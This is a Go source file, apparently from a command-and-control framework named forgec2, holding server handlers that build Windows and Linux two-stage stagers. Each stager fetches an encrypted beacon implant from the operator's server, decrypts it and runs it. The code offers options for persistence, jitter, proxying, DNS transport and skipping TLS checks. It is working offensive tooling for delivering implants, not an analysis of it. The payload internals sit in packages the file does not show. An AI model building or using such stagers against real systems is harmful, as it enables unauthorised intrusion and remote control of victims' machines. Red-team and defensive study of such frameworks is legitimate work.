package server

import (
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/forgec2/forgec2/internal/payload"
	"github.com/forgec2/forgec2/internal/util"
	"github.com/gin-gonic/gin"
)

type stagerGenerateForm struct {
	C2URL           string `form:"c2_url"`
	Protocol        string `form:"protocol"`
	Interval        int    `form:"interval"`
	Jitter          int    `form:"jitter"`
	BeaconTime      int    `form:"beacon_time"`
	UserAgent       string `form:"user_agent"`
	Persist         bool   `form:"persist"`
	SkipTLSVerify   bool   `form:"skip_tls_verify"`
	Filename        string `form:"filename"`
	Profile         string `form:"profile"`
	ListenerID      uint   `form:"listener_id"`
	DNSDomain       string `form:"dns_domain"`
	DNSServer       string `form:"dns_server"`
	BeaconTransport string `form:"beacon_transport"`
	Proxy           string `form:"proxy"`
	CryptoKey       string `form:"crypto_key"`
	Architecture    string `form:"arch"`
	TTLMinutes      int    `form:"ttl_minutes"`
	MTLSCert        string `form:"mtls_cert"`
	MTLSKey         string `form:"mtls_key"`
	MTLSCA          string `form:"mtls_ca"`
	// mintTenant is not form-bound: bindStagerForm stamps the building
	// operator's tenant so the minted registration secret names the team.
	mintTenant uint
}

func (s *Server) bindStagerForm(c *gin.Context) (*stagerGenerateForm, error) {
	var form stagerGenerateForm
	if err := c.ShouldBind(&form); err != nil {
		return nil, fmt.Errorf("invalid request parameters")
	}
	// The minting operator's tenant travels with the build so the v3
	// registration secret names the building team (see createRegSecret).
	form.mintTenant = s.currentTenantID(c)

	// mTLS material for the listener: both the stage-1 fetch and the stage-2
	// beacon need it against a require_client_cert listener, so it is validated
	// here, before any build work starts (the same boundary rule as the direct
	// generator: pair required, key pair must parse, CA bundle must contain PEM).
	form.MTLSCert = strings.TrimSpace(form.MTLSCert)
	form.MTLSKey = strings.TrimSpace(form.MTLSKey)
	form.MTLSCA = strings.TrimSpace(form.MTLSCA)
	if err := payload.ValidateMTLSMaterial(form.MTLSCert, form.MTLSKey, form.MTLSCA); err != nil {
		return nil, err
	}

	if strings.EqualFold(form.BeaconTransport, "raw") || strings.EqualFold(form.BeaconTransport, "shellcode") {
		return nil, fmt.Errorf("raw/shellcode stager format is not implemented; use exe or dll")
	}

	// Sanitize filename to block path traversal and build collisions.
	if form.Filename != "" {
		form.Filename = sanitizeFilename(form.Filename)
		shortID := strings.Replace(util.NewString()[:8], "-", "", -1)
		form.Filename = fmt.Sprintf("%s_%s", shortID, form.Filename)
	}

	isDNS := form.DNSDomain != "" || form.DNSServer != ""
	if !isDNS && form.ListenerID == 0 {
		return nil, fmt.Errorf("listener is required")
	}

	if !isDNS {
		resolved, err := s.resolveListener(form.ListenerID)
		if err != nil {
			return nil, fmt.Errorf("invalid listener configuration")
		}
		merged, err := mergeC2URLList(resolved.C2URL, form.C2URL)
		if err != nil {
			return nil, fmt.Errorf("invalid C2 or failover URL: %w", err)
		}
		form.C2URL = merged
		form.Protocol = resolved.Protocol
		if resolved.DNSDomain != "" {
			form.DNSDomain = resolved.DNSDomain
			if form.DNSServer == "" {
				form.DNSServer = resolved.DNSServer
			}
		}
	} else {
		merged, err := mergeC2URLList("", form.C2URL)
		if err != nil {
			return nil, fmt.Errorf("invalid C2 or failover URL: %w", err)
		}
		form.C2URL = merged
	}

	if form.BeaconTime > 0 {
		if form.Interval <= 0 {
			form.Interval = form.BeaconTime
		}
	}
	if form.Architecture == "" {
		form.Architecture = "amd64"
	}
	if form.TTLMinutes <= 0 {
		form.TTLMinutes = payload.StageTokenTTLDefault
	}
	return &form, nil
}

// stagerFetch builds the token-stager fetch descriptor from a bound form. It is
// pure so the wiring — transport hardening (skip-verify, proxy, user agent) and
// the client material — is testable without a toolchain. Skip-verify used to be
// dropped here, so a stager generated for a self-signed listener always failed
// its stage fetch regardless of the toggle.
func stagerFetch(form *stagerGenerateForm, token, sig, keyHex string) payload.StagerFetch {
	return payload.StagerFetch{
		BaseURL:       payload.OriginFromC2URL(form.C2URL),
		Token:         token,
		Sig:           sig,
		KeyHex:        keyHex,
		SkipTLSVerify: form.SkipTLSVerify,
		Proxy:         form.Proxy,
		UserAgent:     form.UserAgent,
		MTLSCertPEM:   form.MTLSCert,
		MTLSKeyPEM:    form.MTLSKey,
		MTLSCAPEM:     form.MTLSCA,
	}
}

// generateTokenStager performs the shared Windows/Linux stager flow: builds the
// full beacon (stage-2), persists it AES-encrypted at rest, registers the
// signed stage token, then builds the minimal stager that fetches, decrypts
// and executes the stage-2. Returns the generated stager path.
func (s *Server) generateTokenStager(goos string, form *stagerGenerateForm) (string, error) {
	proto := form.Protocol
	if proto == "" {
		proto = "http"
	}

	token, sig, keyHex, err := payload.NewStageToken()
	if err != nil {
		return "", fmt.Errorf("new stage token: %w", err)
	}

	expiresAt := time.Now().Add(time.Duration(form.TTLMinutes) * time.Minute)
	st := db.StagerToken{
		Token:        token,
		ListenerID:   form.ListenerID,
		Architecture: form.Architecture,
		OS:           goos,
		Format:       "exe",
		ExpiresAt:    expiresAt,
	}
	if err := s.db.Create(&st).Error; err != nil {
		return "", fmt.Errorf("register stage token: %w", err)
	}

	dataDir := s.rawDataDir()
	if dataDir == "" {
		dataDir = "data"
	}
	agentsDir := filepath.Join(dataDir, "agents")
	if !filepath.IsAbs(agentsDir) {
		if abs, err := filepath.Abs(agentsDir); err == nil {
			agentsDir = abs
		}
	}

	// Build the full beacon (stage-2) for the target OS.
	beaconKey := s.serverBeaconKey()
	regSecretID, regSecretB64, beaconKey, err := s.ensureV3RegSecret(beaconKey, form.mintTenant)
	if err != nil {
		return "", fmt.Errorf("create v3 registration secret: %w", err)
	}
	stagerCfg := payload.StagerConfig{
		ListenerID:    form.ListenerID,
		C2URL:         form.C2URL,
		Protocol:      proto,
		Architecture:  form.Architecture,
		OS:            goos,
		Format:        "exe",
		UserAgent:     form.UserAgent,
		Profile:       form.Profile,
		SkipTLSVerify: form.SkipTLSVerify,
		DNSDomain:     form.DNSDomain,
		DNSServer:     form.DNSServer,
		BeaconKey:     beaconKey,
		RegSecretID:   regSecretID,
		RegSecret:     regSecretB64,
		MTLSCertPEM:   form.MTLSCert,
		MTLSKeyPEM:    form.MTLSKey,
		MTLSCAPEM:     form.MTLSCA,
	}
	var stagePath string
	if strings.EqualFold(goos, "linux") {
		stagePath, err = payload.GenerateStagerStage2Linux(stagerCfg, agentsDir)
	} else {
		stagePath, err = payload.GenerateStagerStage2(stagerCfg, agentsDir)
	}
	if err != nil {
		return "", fmt.Errorf("stage-2 build: %w", err)
	}

	// The plaintext stage-2 binary exists only until the encrypted blob is
	// written; remove it on every path so a failed build/encrypt cannot leave
	// an unscoped agent binary in the build directory.
	defer os.Remove(stagePath)

	plaintext, err := os.ReadFile(stagePath)
	if err != nil {
		return "", err
	}
	if err := payload.WriteStage2Blob(dataDir, token, plaintext); err != nil {
		return "", fmt.Errorf("encrypt stage-2: %w", err)
	}

	// Build the stager that fetches and decrypts the blob.
	cfg := payload.ImplantConfig{
		C2URL:           form.C2URL,
		Protocol:        proto,
		Interval:        form.Interval,
		Jitter:          form.Jitter,
		UserAgent:       form.UserAgent,
		Persist:         form.Persist,
		SkipTLSVerify:   form.SkipTLSVerify,
		Filename:        form.Filename,
		Debug:           false,
		Profile:         form.Profile,
		ListenerID:      form.ListenerID,
		BeaconTransport: form.BeaconTransport,
		Proxy:           form.Proxy,
		CryptoKey:       form.CryptoKey,
		Architecture:    form.Architecture,
	}
	fetch := stagerFetch(form, token, sig, keyHex)
	var stagerPath string
	if strings.EqualFold(goos, "linux") {
		stagerPath, err = payload.GenerateTokenStagerLinux(cfg, agentsDir, fetch)
	} else {
		stagerPath, err = payload.GenerateTokenStager(cfg, agentsDir, fetch)
	}
	if err != nil {
		return "", err
	}
	if _, statErr := os.Stat(stagerPath); statErr != nil {
		return "", fmt.Errorf("generated stager not found — try regenerating")
	}
	return stagerPath, nil
}

func (s *Server) handleGenerateStager(c *gin.Context) {
	form, err := s.bindStagerForm(c)
	if err != nil {
		// A validation message is the answer here: it names the field the caller got wrong, and replacing it with
		// "Stager generation" told them nothing they could fix.
		respondError(c, http.StatusBadRequest, err.Error())
		return
	}

	stagerPath, err := s.withBuildSlot(func() (string, error) {
		return s.generateTokenStager("windows", form)
	})
	if err != nil {
		s.logStagerBuild("windows", form, "failed", err.Error())
		// buildFailureText, not sanitizeError: the stager error already carries the scrubbed toolchain output, and the sanitizer
		// replaced it with the fallback sentence - the same defect that made a failed payload build read "Build failed".
		respondError(c, http.StatusInternalServerError, buildFailureText(err))
		return
	}

	s.logStagerBuild("windows", form, "success", stagerPath)
	s.registerTransientArtifact(stagerPath)
	agentsDir := filepath.Join(s.rawDataDir(), "agents")
	serveFileSafe(c, stagerPath, agentsDir, filepath.Base(stagerPath))
}

func (s *Server) handleGenerateStagerLinux(c *gin.Context) {
	form, err := s.bindStagerForm(c)
	if err != nil {
		respondError(c, http.StatusBadRequest, err.Error())
		return
	}

	stagerPath, err := s.withBuildSlot(func() (string, error) {
		return s.generateTokenStager("linux", form)
	})
	if err != nil {
		s.logStagerBuild("linux", form, "failed", err.Error())
		respondError(c, http.StatusInternalServerError, buildFailureText(err))
		return
	}

	s.logStagerBuild("linux", form, "success", stagerPath)
	s.registerTransientArtifact(stagerPath)
	agentsDir := filepath.Join(s.rawDataDir(), "agents")
	serveFileSafe(c, stagerPath, agentsDir, filepath.Base(stagerPath))
}

func (s *Server) logStagerBuild(goos string, form *stagerGenerateForm, status, detail string) {
	s.logBuild(goos, "stager", form.C2URL, form.ListenerID, form.Filename, status, detail, "")
}
